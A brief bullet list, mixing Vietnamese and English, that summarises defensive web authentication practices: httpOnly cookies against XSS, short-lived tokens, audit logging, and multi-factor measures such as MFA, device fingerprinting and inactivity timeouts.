- **httpOnly cookie** = chống XSS
- **Short-lived tokens** = giảm impact khi leak
- **Audit logging** = detect suspicious activities
- **Multi-factor** everything (MFA, device fingerprint, inactivity timeout)

